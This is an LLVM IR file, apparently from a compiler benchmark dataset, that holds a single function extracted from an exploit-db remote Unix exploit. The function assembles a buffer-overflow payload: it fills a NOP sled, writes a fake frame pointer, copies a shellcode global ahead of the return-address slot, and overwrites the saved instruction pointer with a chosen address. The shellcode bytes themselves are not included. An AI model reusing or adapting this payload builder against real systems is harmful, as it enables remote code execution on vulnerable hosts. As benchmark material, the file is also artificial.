; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_21089.c_zbuffami.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_21089.c_zbuffami.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@EIP_POS = common dso_local global i32 0, align 4
@FAKE_FP = common dso_local global i32 0, align 4
@shellcode = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [5 x i8] c"iiii\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @zbuffami(i32 %0, i32 %1, i8* %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i32 %0, i32* %4, align 4
  store i32 %1, i32* %5, align 4
  store i8* %2, i8** %6, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  br label %9

9:                                                ; preds = %18, %3
  %10 = load i32, i32* %7, align 4
  %11 = load i32, i32* @EIP_POS, align 4
  %12 = icmp slt i32 %10, %11
  br i1 %12, label %13, label %21

13:                                               ; preds = %9
  %14 = load i8*, i8** %6, align 8
  %15 = load i32, i32* %7, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds i8, i8* %14, i64 %16
  store i8 -112, i8* %17, align 1
  br label %18

18:                                               ; preds = %13
  %19 = load i32, i32* %7, align 4
  %20 = add nsw i32 %19, 1
  store i32 %20, i32* %7, align 4
  br label %9

21:                                               ; preds = %9
  %22 = load i32, i32* @FAKE_FP, align 4
  %23 = and i32 %22, 255
  %24 = trunc i32 %23 to i8
  %25 = load i8*, i8** %6, align 8
  %26 = getelementptr inbounds i8, i8* %25, i64 0
  store i8 %24, i8* %26, align 1
  %27 = load i32, i32* @FAKE_FP, align 4
  %28 = and i32 %27, 65280
  %29 = ashr i32 %28, 8
  %30 = trunc i32 %29 to i8
  %31 = load i8*, i8** %6, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  store i8 %30, i8* %32, align 1
  %33 = load i32, i32* @FAKE_FP, align 4
  %34 = and i32 %33, 16711680
  %35 = ashr i32 %34, 16
  %36 = trunc i32 %35 to i8
  %37 = load i8*, i8** %6, align 8
  %38 = getelementptr inbounds i8, i8* %37, i64 2
  store i8 %36, i8* %38, align 1
  %39 = load i32, i32* @FAKE_FP, align 4
  %40 = and i32 %39, -16777216
  %41 = lshr i32 %40, 24
  %42 = trunc i32 %41 to i8
  %43 = load i8*, i8** %6, align 8
  %44 = getelementptr inbounds i8, i8* %43, i64 3
  store i8 %42, i8* %44, align 1
  %45 = load i32, i32* %5, align 4
  %46 = and i32 %45, 255
  %47 = trunc i32 %46 to i8
  %48 = load i8*, i8** %6, align 8
  %49 = getelementptr inbounds i8, i8* %48, i64 4
  store i8 %47, i8* %49, align 1
  %50 = load i32, i32* %5, align 4
  %51 = and i32 %50, 65280
  %52 = ashr i32 %51, 8
  %53 = trunc i32 %52 to i8
  %54 = load i8*, i8** %6, align 8
  %55 = getelementptr inbounds i8, i8* %54, i64 5
  store i8 %53, i8* %55, align 1
  %56 = load i32, i32* %5, align 4
  %57 = and i32 %56, 16711680
  %58 = ashr i32 %57, 16
  %59 = trunc i32 %58 to i8
  %60 = load i8*, i8** %6, align 8
  %61 = getelementptr inbounds i8, i8* %60, i64 6
  store i8 %59, i8* %61, align 1
  %62 = load i32, i32* %5, align 4
  %63 = and i32 %62, -16777216
  %64 = lshr i32 %63, 24
  %65 = trunc i32 %64 to i8
  %66 = load i8*, i8** %6, align 8
  %67 = getelementptr inbounds i8, i8* %66, i64 7
  store i8 %65, i8* %67, align 1
  %68 = load i32, i32* @EIP_POS, align 4
  %69 = sub nsw i32 %68, 4
  %70 = load i8*, i8** @shellcode, align 8
  %71 = call i32 @strlen(i8* %70)
  %72 = sub nsw i32 %69, %71
  %73 = sub nsw i32 %72, 8
  store i32 %73, i32* %7, align 4
  br label %74

74:                                               ; preds = %91, %21
  %75 = load i32, i32* %7, align 4
  %76 = load i32, i32* @EIP_POS, align 4
  %77 = sub nsw i32 %76, 4
  %78 = sub nsw i32 %77, 8
  %79 = icmp slt i32 %75, %78
  br i1 %79, label %80, label %94

80:                                               ; preds = %74
  %81 = load i8*, i8** @shellcode, align 8
  %82 = load i32, i32* %8, align 4
  %83 = add nsw i32 %82, 1
  store i32 %83, i32* %8, align 4
  %84 = sext i32 %82 to i64
  %85 = getelementptr inbounds i8, i8* %81, i64 %84
  %86 = load i8, i8* %85, align 1
  %87 = load i8*, i8** %6, align 8
  %88 = load i32, i32* %7, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds i8, i8* %87, i64 %89
  store i8 %86, i8* %90, align 1
  br label %91

91:                                               ; preds = %80
  %92 = load i32, i32* %7, align 4
  %93 = add nsw i32 %92, 1
  store i32 %93, i32* %7, align 4
  br label %74

94:                                               ; preds = %74
  store i32 0, i32* %8, align 4
  br label %95

95:                                               ; preds = %104, %94
  %96 = load i32, i32* %8, align 4
  %97 = icmp slt i32 %96, 8
  br i1 %97, label %98, label %107

98:                                               ; preds = %95
  %99 = load i8*, i8** %6, align 8
  %100 = load i32, i32* %7, align 4
  %101 = add nsw i32 %100, 1
  store i32 %101, i32* %7, align 4
  %102 = sext i32 %100 to i64
  %103 = getelementptr inbounds i8, i8* %99, i64 %102
  store i8 105, i8* %103, align 1
  br label %104

104:                                              ; preds = %98
  %105 = load i32, i32* %8, align 4
  %106 = add nsw i32 %105, 1
  store i32 %106, i32* %8, align 4
  br label %95

107:                                              ; preds = %95
  %108 = load i32, i32* %4, align 4
  %109 = and i32 %108, 255
  %110 = trunc i32 %109 to i8
  %111 = load i8*, i8** %6, align 8
  %112 = load i32, i32* @EIP_POS, align 4
  %113 = sub nsw i32 %112, 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds i8, i8* %111, i64 %114
  store i8 %110, i8* %115, align 1
  %116 = load i32, i32* %4, align 4
  %117 = and i32 %116, 65280
  %118 = ashr i32 %117, 8
  %119 = trunc i32 %118 to i8
  %120 = load i8*, i8** %6, align 8
  %121 = load i32, i32* @EIP_POS, align 4
  %122 = sub nsw i32 %121, 3
  %123 = sext i32 %122 to i64
  %124 = getelementptr inbounds i8, i8* %120, i64 %123
  store i8 %119, i8* %124, align 1
  %125 = load i32, i32* %4, align 4
  %126 = and i32 %125, 16711680
  %127 = ashr i32 %126, 16
  %128 = trunc i32 %127 to i8
  %129 = load i8*, i8** %6, align 8
  %130 = load i32, i32* @EIP_POS, align 4
  %131 = sub nsw i32 %130, 2
  %132 = sext i32 %131 to i64
  %133 = getelementptr inbounds i8, i8* %129, i64 %132
  store i8 %128, i8* %133, align 1
  %134 = load i32, i32* %4, align 4
  %135 = and i32 %134, -16777216
  %136 = lshr i32 %135, 24
  %137 = trunc i32 %136 to i8
  %138 = load i8*, i8** %6, align 8
  %139 = load i32, i32* @EIP_POS, align 4
  %140 = sub nsw i32 %139, 1
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds i8, i8* %138, i64 %141
  store i8 %137, i8* %142, align 1
  %143 = load i8*, i8** %6, align 8
  %144 = load i32, i32* @EIP_POS, align 4
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds i8, i8* %143, i64 %145
  store i8 0, i8* %146, align 1
  store i32 0, i32* %7, align 4
  br label %147

147:                                              ; preds = %153, %107
  %148 = load i32, i32* %7, align 4
  %149 = icmp slt i32 %148, 4
  br i1 %149, label %150, label %156

150:                                              ; preds = %147
  %151 = load i8*, i8** %6, align 8
  %152 = call i32 @strcat(i8* %151, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0))
  br label %153

153:                                              ; preds = %150
  %154 = load i32, i32* %7, align 4
  %155 = add nsw i32 %154, 1
  store i32 %155, i32* %7, align 4
  br label %147

156:                                              ; preds = %147
  ret void
}

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @strcat(i8*, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
